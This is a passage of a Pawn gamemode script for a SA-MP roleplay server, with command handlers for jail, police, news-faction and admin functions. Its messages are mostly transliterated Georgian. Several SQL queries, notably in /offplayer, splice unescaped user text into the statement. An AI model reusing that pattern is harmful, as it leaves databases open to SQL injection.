		pData[id][pPrison] = 0;
		pData[id][pJail] = 0;
		pData[id][pWanted] = 0;
		SetPlayerWantedLevel(id,0);
		ResetPlayerWeapons(id);
		new query[180];
		format(query,sizeof(query),"UPDATE `members` SET `jail` = '%d', prison = '%d', wanted = '0' WHERE `nickname` = '%s'",pData[id][pJail],pData[id][pPrison],Name2(id));
		mysql_empty(mysql, query);
		if(mysql_errno()) SendClientMessage(playerid,CRED,"Shecdoma MySQL");
		format(mes,sizeof(mes),"%s Gamoxvedit Cixidan.",Name2(playerid));
		SendClientMessage(id,CBADINFO,mes);
		format(mes,sizeof(mes),"Shen Gamoxvedi %s Cixidan.",Name2(id));
		SendClientMessage(playerid,CINFO,mes);
		SpawnPlayer(id);
	}
	if(!strcmp(cmd,"/jail",true))
	{
	    if(pData[playerid][pAdmin] < 1) return true;
        tmp = strtok(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/jail [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(pTemp[id][pCuffer] != INVALID_PLAYER_ID)
		{
			new cuffer = pTemp[id][pCuffer];
			SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
			RemovePlayerAttachedObject(id,0);
			pTemp[id][pCuffer] = INVALID_PLAYER_ID;
			pTemp[id][pCuffee] = INVALID_PLAYER_ID;
			pTemp[cuffer][pCuffee] = INVALID_PLAYER_ID;
			pTemp[cuffer][pCuffer] = INVALID_PLAYER_ID;
		}
		pData[id][pPrison] = 10;
		pData[id][pJail] = 30;
		pData[id][pWanted] = 0;
		SetPlayerWantedLevel(id,0);
		ResetPlayerWeapons(id);
		new query[180];
		format(query,sizeof(query),"UPDATE `members` SET `jail` = '%d', prison = '%d', wanted = '0' WHERE `nickname` = '%s'",pData[id][pJail],pData[id][pPrison],Name2(id));
		mysql_empty(mysql, query);
		if(mysql_errno()) SendClientMessage(playerid,CRED,"Ошибка MySQL");
		format(mes,sizeof(mes),"Shen Chagsva Adminma: %s Cixeshi %d Wutit.",Name2(playerid),pData[id][pJail]);
		SendClientMessage(id,CBADINFO,mes);
		format(mes,sizeof(mes),"Shen Chasvi: %s Cixeshi %d Wutit.",Name2(id),pData[id][pJail]);
		SendClientMessage(playerid,CINFO,mes);
		SpawnPlayer(id);
		SetPVarInt(id,"IsInKamera",2);
	}
	if(!strcmp(cmd,"/tyrma",true))
	{
	    if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Mxolod Policielma An FBI-M Sheidzleba Gamoiyenos");
        tmp = strtok(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/tyrma [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(GetPlayerDistanceToPlayer(playerid,id) > 10.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		if(!pData[id][pWanted]) return SendClientMessage(playerid,CGRAY,"Am Motamashes Ar Chaudenia Danashauli");
		if(PlayerToPoint(20.0,playerid,3440.9155,-684.6065,10.9669))
		{
			if(pTemp[id][pCuffer] != INVALID_PLAYER_ID)
			{
				new cuffer = pTemp[id][pCuffer];
				SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
				RemovePlayerAttachedObject(id,0);
				pTemp[id][pCuffer] = INVALID_PLAYER_ID;
				pTemp[id][pCuffee] = INVALID_PLAYER_ID;
				pTemp[cuffer][pCuffee] = INVALID_PLAYER_ID;
				pTemp[cuffer][pCuffer] = INVALID_PLAYER_ID;
			}
			pData[id][pPrison] = 10;
			pData[id][pJail] = pData[id][pWanted]*5;
			SetPlayerWantedLevel(id,0);
			ResetPlayerWeapons(id);
			format(mes,sizeof(mes),"Shen Chasvi Cixeshi %s Amdeni %d Wutit.",Name2(playerid),pData[id][pJail]);
			SendClientMessage(id,CBADINFO,mes);
			format(mes,sizeof(mes),"Shen Chagsves %s Cixeshi Amdeni %d Wutit.",Name2(id),pData[id][pJail]);
			SendClientMessage(playerid,CINFO,mes);
			pData[id][pWanted] = 0;
			new query[180];
			format(query,sizeof(query),"UPDATE `members` SET `jail` = '%d', prison = '%d', wanted = '0' WHERE `nickname` = '%s'",pData[id][pJail],pData[id][pPrison],Name2(id));
			mysql_empty(mysql, query);
			if(mysql_errno()) SendClientMessage(playerid,CRED,"Shecdoma MySQL");
			SpawnPlayer(id);
			SetPVarInt(id,"IsInKamera",2);
		}
		else return SendClientMessage(playerid,CGRAY,"Tqven Unda Iyot Cixeshi");
	}
	if(!strcmp(cmd,"/push",true))
    {
		if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Mxolod Policielma An FBI-M Sheidzleba Gamoiyenos");
		tmp = strtok(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/push [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || id == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		if(GetPlayerDistanceToPlayer(playerid,id) > 3.0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CGRAY,"Tqven Xart Shors Ertmanetisgan");
		new Float:x, Float:y, Float:z;
		GetPlayerPos(id,x,y,z);
		for(new i=1;i<=MAX_VEHICLES;i++)
		{
			if(!IsVehicleStreamedIn(i,playerid)) continue;
			new model = GetVehicleModel(i);
			if(model == 497 || model == 596 || model == 597 || model == 598 || model == 599 || model == 528 || model == 490 || model == 427)
			{
				new Float:vx, Float:vy, Float:vz;
				GetVehiclePos(i,vx,vy,vz);
				if(PointToPoint3D(x,y,z,vx,vy,vz) <= 8.0)
				{
					new seat = GetFreeSeat(i);
					if(seat == -1) continue;
					PutPlayerInVehicle(id,i,seat);
					MeAction(playerid,"посадил преступника в транспорт");
					if(pTemp[id][pCuffee] == id) TogglePlayerControllable(id,0);
					break;
				}
			}
		}
	}
	if(!strcmp(cmd,"/wanted",true))
    {
		if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Mxolod Policielma An FBI-M Sheidzleba Gamoiyenos");
		SendClientMessage(playerid,CINFO,"Damnashaveta Sia:");
		for(new i=0,g=1;i<MAX_PLAYERS;i++)
		{
			if(!IsPlayerConnected(i)) continue;
			if(!pData[i][pWanted]) continue;
			format(mes, sizeof(mes), "%d. Saxeli: {42aaff}%s {ffffff}ID: {42aaff}%i {ffffff}Dzebnis Done: {42aaff}%d", g++, Name2(i),i,pData[i][pWanted]);
			SendClientMessage(playerid, CWHITE, mes);
		}
	}
	if(!strcmp(cmd,"/m",true))
    {
		if(!IsACop(playerid)) return SendClientMessage(playerid,CGRAY,"Es Punqcia Mxolod Policielma An FBI-M Sheidzleba Gamoiyenos");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CGRAY,"Tqven Unda Ijdet Samushaos Avtomobilshi");
		new model = GetVehicleModel(GetPlayerVehicleID(playerid));
		if(model == 497 || model == 596 || model == 597 || model == 598 || model == 599 || model == 528 || model == 490 || model == 427){}
		else return SendClientMessage(playerid,CGRAY,"Tqven Unda Ijdet Samushaos Avtomobilshi");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/m [Text]");
		format(mes,sizeof(mes),"[Мегафон] %s: %s!",Name2(playerid),tmp);
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(!IsPlayerConnected(i) || GetPVarInt(i,"Logined") == 0 || GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
			new Float:rdist;
			rdist = GetPlayerDistanceToPlayer(playerid,i);
			if(rdist > 45.0) continue;
			SendClientMessage(i,CYELLOW,mes);
		}
	}
	if(!strcmp(cmd,"/bullpen",true))
    {
		if(!pData[playerid][pJail]) return SendClientMessage(playerid,CGRAY,"Tqven Ar Zixart KPZ/Cixeshi. (An Srokis Dro Gasulia)");
		new jailname[12];
		switch(pData[playerid][pPrison])
		{
			case 0: jailname = "LSPD";
			case 1: jailname = "SFPD";
			case 2: jailname = "LVPD";
			case 10: jailname = "JAIL";
		}
		new mes2[128];
		format(mes2,sizeof(mes2),"~g~%s~n~~w~REMAIN: ~y~%d ~w~MIN",jailname,pData[playerid][pJail]);
		GameTextForPlayer(playerid,mes2,1,1);
	}
	if(!strcmp(cmd,"/eject",true))
	{
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,CWHITE,"Tqven Unda Ijdet Avtomobilshi.");
		if(GetPlayerVehicleSeat(playerid) != 0) return SendClientMessage(playerid,CGRAY,"Tqven Unda Ijdet Rulze");
		tmp = strtok(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/eject [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || id == playerid) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		new vehicleid = GetPlayerVehicleID(playerid);
		if(vehicleid == GetPlayerVehicleID(id) && GetPlayerVehicleSeat(id) != 0)
		{
			SFCM(id,CGRAY,"%s Gadmogagdot Avtomobilidan",Name2(playerid));
			if(pTemp[id][pCuffee] == id) TogglePlayerControllable(id,1);
			RemovePlayerFromVehicle(id);
		}
	}
	if(!strcmp(cmd,"/pc",true))
	{
		new fractionid = pData[playerid][pFraction] - 1;
		new subfraction = pData[playerid][pSubfraction];
		if(fractionid != 8 || !subfraction) return SendClientMessage(playerid,CGRAY,"Es Funqcia Ar Aris Xelmisawvdomi Tqventvis");
		new caller = gEmCall[0];
		if(caller == INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Zari Ukve Migebulia");
		gEmCall[0] = INVALID_PLAYER_ID;
		if(!IsPlayerConnected(caller)) return SendClientMessage(playerid,CGRAY,"Motamashe Gavida");
		new Float:x, Float:y, Float:z;
		GetPlayerPos(caller,x,y,z);
		SetPlayerCheckpoint(playerid,x,y,z,4.0);
		SetPVarInt(playerid,"GPS",1);
		format(mes,sizeof(mes),"%s (%s) Miigo Zari",Name2(playerid),gSubfractionName[2][subfraction-1]);
		SendClientMessage(caller,CINFO,mes);
		DepartmentChat(CDEPARTMENT,mes,0,0,1,0,0);
		SendClientMessage(playerid,CINFO,"Adgili Monishnulia Radarze. Rukis Amosagebad Gamoiyenet: {"#cWHITE"}/map");
	}
	if(!strcmp(cmd,"/mc",true))
	{
		new fractionid = pData[playerid][pFraction] - 1;
		new subfraction = pData[playerid][pSubfraction];
		if(fractionid != 1 || !subfraction) return SendClientMessage(playerid,CGRAY,"Es Funqcia Ar Aris Xelmisawvdomi Tqventvis");
		new caller = gEmCall[1];
		if(caller == INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Zari Ukve Migebulia");
		gEmCall[0] = INVALID_PLAYER_ID;
		if(!IsPlayerConnected(caller)) return SendClientMessage(playerid,CGRAY,"Motamashe Gavida");
		new Float:x, Float:y, Float:z;
		GetPlayerPos(caller,x,y,z);
		SetPlayerCheckpoint(playerid,x,y,z,4.0);
		SetPVarInt(playerid,"GPS",1);
		format(mes,sizeof(mes),"%s (%s) Miigo Zari",Name2(playerid),gSubfractionName[0][subfraction-1]);
		SendClientMessage(caller,CINFO,mes);
		DepartmentChat(CDEPARTMENT,mes,1,0,0,0,0);
		SendClientMessage(playerid,CINFO,"Adgili Monishnulia Radarze. Rukis Amosagebad Gamoiyenet: {"#cWHITE"}/map");
	}
	if(!strcmp(cmd,"/rc",true))
	{
		if(pData[playerid][pJob] != 4) return SendClientMessage(playerid,CGRAY,"Es Funqcia Ar Aris Xelmisawvdomi Tqventvis");
		if(pTemp[playerid][pMechID] == INVALID_VEHICLE_ID) return SendClientMessage(playerid,CGRAY,"Tqven Pirvelad Unda Moxsnat Buqsiri");
		new caller = gEmCall[2];
		if(caller == INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Zari Ukve Migebulia");
		gEmCall[2] = INVALID_PLAYER_ID;
		if(!IsPlayerConnected(caller)) return SendClientMessage(playerid,CGRAY,"Motamashe Gavida");
		new Float:x, Float:y, Float:z;
		GetPlayerPos(caller,x,y,z);
		SetPlayerCheckpoint(playerid,x,y,z,4.0);
		SetPVarInt(playerid,"GPS",1);
		format(mes,sizeof(mes),"%s Miigo Zari",Name2(playerid));
		SendClientMessage(caller,CINFO,mes);
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(pData[i][pJob] != 4 || pTemp[i][pMechID] == INVALID_VEHICLE_ID) continue;
			SendClientMessage(i,CDEPARTMENT,mes);
		}
		SendClientMessage(playerid,CINFO,"Adgili Monishnulia Radarze. Rukis Amosagebad Gamoiyenet: {"#cWHITE"}/map");
	}
	if(!strcmp(cmd,"/ad",true))
	{
		if(gAdvertCount >= MAX_ADVERT_COUNT) return SendClientMessage(playerid,CGRAY,"Samwuxarod, Gancxadebebi Dakavebulia, Scadet Mogvianebit");
		if(!pData[playerid][pPhone]) return SendClientMessage(playerid,CGRAY,"Tqven Gchirdebat Telefoni, Rom Gaagzavnot Reklama");
		if(pData[playerid][pMut]) return SendClientMessage(playerid,CGRAY,"Tqven Gadevt Mute.");
		tmp = strrest(cmdtext,idx);
		new len = strlen(tmp);
		if(!len) return SendClientMessage(playerid,CGRAY,"/ad [Sasurveli Teqsti]");
		if(len > 100) return SendClientMessage(playerid,CGRAY,"Maximaluri Simbolos Raodenoba - 100 Simbolo");
		SetPVarString(playerid,"advert",tmp);
		new price = len * gAdvertPrice;
		new mes2[128];
		format(mes2,sizeof(mes2),"{"#cWHITE"}Reklamis Fasi: {"#cRED"}$%d.\n{"#cWHITE"}Darwmunebuli Xart Rom Gsurt, Gamoaqveynot Reklama?",price);
		ShowPlayerDialog(playerid,dAdvertSend,0,"Reklama",mes2,"YES","NO");
	}
	if(!strcmp(cmd,"/adlist",true))
	{
		if(pData[playerid][pFraction] != 10) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod News-Istvis");
		ShowAdvertList(playerid);
	}
	if(!strcmp(cmd,"/ether",true))
	{
		if(pData[playerid][pFraction] != 10) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod News-Istvis");
		if(GetPVarInt(playerid,"Ether") == 0)
		{
			new vehicleid = GetPlayerVehicleID(playerid);
			if(vehicleid >= aNews[0] && vehicleid <= aNews[1])
			{
				SetPVarInt(playerid,"Ether",1);
				SendClientMessage(playerid,CGREEN,"Tqven Xart Etershi");
			}
			else return SendClientMessage(playerid,CGRAY,"Pirdapir Etershi Gasvka Shesadzlebelia Mxolod News-Is Manqanidan");
		}
		else
		{
			SetPVarInt(playerid,"Ether",0);
			SendClientMessage(playerid,CGREEN,"Tqven Datovet Eteri");
		}

	}
	if(!strcmp(cmd,"/dial",true))
	{
		if(pData[playerid][pFraction] != 10) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod News-Istvis");
		if(GetPVarInt(playerid,"Ether") == 0) return SendClientMessage(playerid,CGRAY,"Rom Daiwyo Pirdapiri Eteri,Unda Miigo Zari");
		if(pData[playerid][pRank] < 5) return SendClientMessage(playerid,CGRAY,"Pirdapir Etershi Chartvistvis Unda Iyo 5 Ranki");
		if(gNewsDialing)
		{
			format(mes,sizeof(mes),"%s Ukve Miige Zari",Name2(gNewsDialer));
			SendClientMessage(playerid,CGRAY,mes);
			return true;
		}
		tmp = strtok(cmdtext,idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/dial [Zaris Fasi]");
		new price = strval(tmp);
		if(price < 0) return SendClientMessage(playerid,CGRAY,"Araswori Fasi");
		if(price > 150) return SendClientMessage(playerid,CGRAY,"1 Zaris Fasi Unda Iyos Max: $150");
		format(mes,sizeof(mes),"[R] %s Zarebis Migeba Daiwyo. Zaris Fasi: $%d",Name2(playerid),price);
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(!IsPlayerConnected(i) || pData[i][pFraction] != 10) continue;
			SendClientMessage(i,CBLUE,mes);
		}
		gNewsDialing = true;
		gNewsDialer = playerid;
		gNewsDialee = INVALID_PLAYER_ID;
		gNewsDialPrice = price;
	}
	if(!strcmp(cmd,"/hdial",true))
	{
		if(pData[playerid][pFraction] != 10) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod News-Istvis");
		if(gNewsDialee == INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Araa Online");
		SendClientMessage(gNewsDialee,CWHITE,"Tqven Ar Xart Wamyvani");
		SetPlayerSpecialAction(gNewsDialee,SPECIAL_ACTION_STOPUSECELLPHONE);
		SetTimerEx("ClearPhone",2000,false,"i",gNewsDialee);
		gNewsDialee = INVALID_PLAYER_ID;
		SendClientMessage(playerid,CSYSTEM,"Motamashem Gatisha");
	}
	if(!strcmp(cmd,"/stopdial",true))
	{
		if(pData[playerid][pFraction] != 10) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod News-Istvis");
		if(pData[playerid][pRank] < 5) return SendClientMessage(playerid,CGRAY,"Pirdapir Etershi Chartvistvis Unda Iyo 5 Ranki");
		if(gNewsDialer != playerid) return SendClientMessage(playerid,CGRAY,"Sheudzlebelia");
		if(pData[playerid][pFraction] != 10) return SendClientMessage(playerid,CGRAY,"Es Funqcia Xelmisawvdomia Mxolod News-Istvis");
		if(gNewsDialee == INVALID_PLAYER_ID) return SendClientMessage(playerid,CGRAY,"Araa Online");
		SendClientMessage(gNewsDialee,CWHITE,"Tqven Ar Xart Wamyvani");
		SetPlayerSpecialAction(gNewsDialee,SPECIAL_ACTION_STOPUSECELLPHONE);
		SetTimerEx("ClearPhone",2000,false,"i",gNewsDialee);
		gNewsDialee = INVALID_PLAYER_ID;
		SendClientMessage(playerid,CSYSTEM,"Motamashem Gatisha");
		gNewsDialing = false;
		gNewsDialer = INVALID_PLAYER_ID;
		gNewsDialee = INVALID_PLAYER_ID;
		gNewsDialPrice = 0;
		format(mes,sizeof(mes),"[R] %s Pirdapiri Eteri Shewyda. Shemosulia: $%d",Name2(playerid),gNewsDialMoney);
		gNewsMoney += gNewsDialMoney;
		SaveNewsMoney();
		gNewsDialMoney = 0;
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(!IsPlayerConnected(i) || pData[i][pFraction] != 10) continue;
			SendClientMessage(i,CBLUE,mes);
		}
	}
	if(!strcmp(cmd,"/nmoney",true))
	{
		if(pData[playerid][pFraction] != 10) return true;
		SFCM(playerid,CGREEN,"Organizaciis Angarishzea: $%d",gNewsMoney);
	}
	if(!strcmp(cmd,"/ngetmoney",true))
	{
		if(pData[playerid][pFraction] != 10) return true;
		if(pData[playerid][pRank] != 10) return SendClientMessage(playerid,CGRAY,"Funqcia Xelmisawvdomia Mxolod Lideristvis");
		tmp = strtok(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/ngetmoney [Tanxis Raodenoba]");
		new amount = strval(tmp);
		if(amount < 1 || amount > 100000) return SendClientMessage(playerid,CGRAY,"Raodenoba Unda Iyos 1-Dan 100000-Mde");
		if(gNewsMoney < amount) return SendClientMessage(playerid,CGRAY,"Organizaciis Angarishze Ar Aris Sakmarisi Tanxa");
		gNewsMoney -= amount;
		SaveNewsMoney();
		TransferMoney(-1,playerid,amount);
	}
	if(!strcmp(cmd,"/radio",true))
	{
		if(GetPVarInt(playerid,"Radio") == 1)
		{
			SetPVarInt(playerid,"Radio",0);
			SendClientMessage(playerid,CDARKGREEN,"Radio Gamortulia");
		}
		else
		{
			SetPVarInt(playerid,"Radio",1);
			SendClientMessage(playerid,CGREEN,"Radio Chartulia");
		}
		return true;
	}
	if(!strcmp(cmd,"/donate",true))
	{
		ShowPlayerDialog(playerid,dDonate,2,"Donate Menu","1. Satamasho Valuta (1GEL = $50000)\n2. Nikis Shecvla (50 DM)\n3. Sqesis Shecvla (10 DM)\n4. Asakis Shecvla (100 DM)\n5. Warn-is Axsna (150 DM)\n6. Saswavlo Ganvitarebebi (150 DM)\n7. Gamdzleoba, Dzala (300 DM)\n8. 1000 Metali + 1500 Tyvia (100 DM)\n9. Iaragis Skilebi (300 DM)\n10. Axali Qcevebis Chartva\n{739F95}11. Balansis Shemowmeba","NEXT","CLOSE");
	}
	//Админ команды
	if(!strcmp(cmd,"/ahelp",true))
	{
		if(pData[playerid][pAdmin] < 1) return true;
		SendClientMessage(playerid, CYELLOW, "Xelmisawvdomi C.M.D:");
		if(pData[playerid][pAdmin] >= 1) SendClientMessage(playerid, 0xC99700ff, "1 Level: /jail /unjail /re /a /pm /goto /mute /unmute /tp /gmcheck /weap /astats /golod");
		if(pData[playerid][pAdmin] >= 2) SendClientMessage(playerid, 0xC99700ff, "2 Level: /offadmins /sethp /fillcar /geton /gethere /kick");
		if(pData[playerid][pAdmin] >= 3) SendClientMessage(playerid, 0xC99700ff, "3 Level: /auninvite /ao /warn /unwarn /gun");
		if(pData[playerid][pAdmin] >= 4) SendClientMessage(playerid, 0xC99700ff, "4 Level: /ban /cc /veh /getip /unban /delveh");
		if(pData[playerid][pAdmin] >= 5) SendClientMessage(playerid, 0xC99700ff, "5 Level: /setstat /agl /skick /gzcolor /offplayer /makeleader /banip /unbanip");
		if(pData[playerid][pAdmin] >= 6) SendClientMessage(playerid, 0xC99700ff, "6 Level: /givemoney /setapanel");
	}
	if(!strcmp(cmd,"/hhelp",true))
	{
		if(pData[playerid][pHelper] < 1) return true;
		SendClientMessage(playerid, CYELLOW, "Xelmisawvdomi C.M.D:");
		if(pData[playerid][pHelper] >= 1) SendClientMessage(playerid, 0xC99700ff, "1 Level: /hmute /hpm");
		if(pData[playerid][pHelper] >= 2) SendClientMessage(playerid, 0xC99700ff, "2 Level: /hkick");
		if(pData[playerid][pHelper] >= 3) SendClientMessage(playerid, 0xC99700ff, "3 Level: /hwarn");
		if(pData[playerid][pHelper] >= 4) SendClientMessage(playerid, 0xC99700ff, "4 Level: /hsp");
	}
	if(!strcmp(cmd,"/offplayer",true))
	{
	    if(pData[playerid][pAdmin] < 5) return true;
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/offplayer [Saxeli Motamashis]");
		new query[256];
		format(query, sizeof(query), "UPDATE `members` SET `fraction` = '0',`subfraction` = '0' WHERE `nickname` = '%s' AND `fraction` > 0", tmp);
		mysql_tquery(mysql, query, "mysql_offplayer", "ds", playerid, tmp);
		return true;
	}
	if(!strcmp(cmd, "/cc", true))
	{
        if(pData[playerid][pAdmin] < 4) return true;
		for(new o; o < 20; o++) SendClientMessageToAll(-1,"");
		format(mes, sizeof(mes), "Administratorma %s Gaasuptava Chati.",Name2(playerid));
		SendClientMessageToAll(0xFBEC5DFF,mes);
	}
	if(!strcmp(cmd, "/golod", true))
	{
		if(pData[playerid][pAdmin] < 1) return true;
		pData[playerid][pHunger] = 500;
		SendClientMessage(playerid,CGRAY,"Ваша сытость была пополнена. (!)");
	}
	if(!strcmp(cmd, "/delveh", true))
	{
		if(pData[playerid][pAdmin] < 4) return true;
		RemovePlayerFromVehicle(playerid), DestroyVehicle(GetPlayerVehicleID(playerid));
	}
	if(!strcmp(cmd,"/astats",true))
	{
	    if(pData[playerid][pAdmin] < 1) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/astats [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
  		new mes2[400],sex[12],fraction[32],job[32],rank[32],classname[20],bussiness[32],housenumber[12];
		if(pData[id][pSex] == 2) sex = "Qali";
		else sex = "Mamakaci";
		new wanted,warn;
		if(pData[id][pWanted]) wanted = del(pData[id][pWanted],WANTED_TIME);
		if(pData[id][pWarn]) warn = del(pData[id][pWarn]-gCurDay,WARN_TIME);
		new fractionid = pData[id][pFraction]-1;
		if(!pData[id][pFraction]) {fraction = "Ara"; rank="Ara";}
		else
		{
			strcat(fraction,gFractionName[fractionid]);
			strcat(rank,gFractionRankName[fractionid][pData[id][pRank]-1]);
		}
		if(pData[id][pSubfraction])
		{
			new frid = GetSubfractionID(fractionid);
			new subid = pData[id][pSubfraction] - 1;
			if(pData[id][pSubfraction]) strcat(job,gSubfractionName[frid][subid]);
			else if(pData[id][pRank] == 10) job = "Saministro";
			else job = "Ucnobia";
		}
		else if(pData[id][pJob]) strcat(job,gJobNames[pData[id][pJob]-1]);
		else job = "Umushevari";
		if(pData[id][pHouse])
		{
			format(housenumber,sizeof(housenumber),"%d",pData[id][pHouse]);
			switch(gHouses[pData[id][pHouse]-1][houseClass])
			{
				case 0:classname = "[Ekonomi]";
				case 1:classname = "[Sashualo]";
				case 2:classname = "[Elituri]";
				case 3:classname = "[Agaraki]";
				default: classname = "[Ucnobia]";
			}
		}
		else format(housenumber,sizeof(housenumber),"Araris");
		if(pData[id][pBusiness]) format(bussiness,sizeof(bussiness),"Aris");
		else format(bussiness,32, "Araris");
		format(mes2,sizeof(mes2),"{"#cWHITE"}Saxeli: \t\t\t\t{1e90ff}%s{"#cWHITE"}\n\nDone: \t\t\t%d (%d/%d)\nGaprtxilebebi: \t\t%d\n\nTel \t\t\t\t%d\n\nDzebnis Done: \t\t%d\n\nSqesi: \t\t\t\t%s\nAsaki: \t\t\t%d\n\nOrganizacia: \t\t\t%s\nSamushao / Tanamdeboba: \t\t%s\nRanki: \t\t\t\t%s\n\n{"#cWHITE"}Saxli: \t\t\t\t%s %s\nBiznesi: \t\t\t%s",
		Name2(id),pData[id][pLevel],pData[id][pExp],pData[id][pLevel]*6,warn,pData[id][pPhone],wanted,
		sex,pData[id][pAge],fraction,job,rank,housenumber,classname,bussiness);
		ShowPlayerDialog(playerid,dMes,0,"{ffcc00}Motamashis Statistika",mes2,"CLOSE","");
	}
	if(!strcmp(cmd,"/weap",true))
	{
		if(pData[playerid][pAdmin] < 1) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/weap [ID Motamashis]");
		new weap = strval(tmp);
		if(!IsPlayerConnected(weap)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		new strings[1000],strin[100],strs[100],gunname[32];
		new weapons[13][2];
		format(strs, 100, "Motamashe:\t\t\t%s", Name2(weap));
		strcat(strings, strs);
		for (new i = 0; i < 13; i++)
		{
			GetPlayerWeaponData(weap, i, weapons[i][0], weapons[i][1]);
			GetWeaponName(weapons[i][0],gunname,32);
			if(weapons[i][0] != 0)
			{
				format(strin,70,"{FFFFFF}\n\nIaragi:\t\t%s (%d)\nTyviebi:\t\t%d",gunname,weapons[i][0],weapons[i][1]);
				strcat(strings,strin);
			}
		}
		ShowPlayerDialog(playerid,dMes,0,"Motamashis Iaragi",strings,"CLOSE","");
	}
	if(!strcmp(cmd,"/gmcheck",true))
	{
	    if(pData[playerid][pAdmin] < 1) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/gmchech [ID Motamashis]");
		new id = strval(tmp);
		if(GetPVarInt(id,"pAFK") >= 3) return SendClientMessage(playerid, CGRAY, "Motamashe Aris AFK.");
	    GetPlayerHealth(id,GMHP[id][0]);
	    GetVehicleHealth(GetPlayerVehicleID(id),VEHHP[id][0]);
		SetPlayerHealthEx(id, 100.0);
		SetVehicleHealth(GetPlayerVehicleID(id),10000.0);
		SetTimerEx("GETHP",1000,false,"i",id);
		new Float:boomx, Float:boomy, Float:boomz;
		GetPlayerPos(id,boomx, boomy, boomz);
		CreateExplosion(boomx, boomy+3, boomz+8, 5, 2);
	}
	if(!strcmp(cmd,"/unbanip",true))
    {
        if(pData[playerid][pAdmin] < 5) return true;
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/unbanip [IP Adress]");
        new string[90];
        format(string,sizeof(string),"unbanip %s",tmp);
        SendRconCommand(string);
        SendRconCommand("reloadbans");
        format(string, 256, "%s Unbanned IP: %s", Name2(playerid), tmp);
		AdminChat(CGREEN,string);
	}
	if(!strcmp(cmd,"/banip",true))
    {
        if(pData[playerid][pAdmin] < 6) return true;
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/banip [IP Adress]");
        new string[90];
        format(string,sizeof(string),"banip %s",tmp);
        SendRconCommand(string);
        SendRconCommand("reloadbans");
        format(string, 256, "%s Banned IP: %s", Name2(playerid), tmp);
		AdminChat(CGREEN,string);
    }
	if(!strcmp(cmd,"/sethp",true))
	{
		if(pData[playerid][pAdmin] < 2) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/hp [ID Motamashis] [HP]");
		new id = strval(tmp);
		tmp = strtok(cmdtext, idx);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		new Float:health;
		health = floatstr(tmp);
		if(health < 0 || health > 100.0) return SendClientMessage(playerid,CGRAY,"HP Limiti 0-Dan 100-Mde");
		SetPlayerHealthEx(id,health);
		pData[id][pHealth] = health;
		GameTextForPlayer(id,"~w~~n~~n~~n~~n~~n~~r~HEAL",3000,3);
		return true;
	}
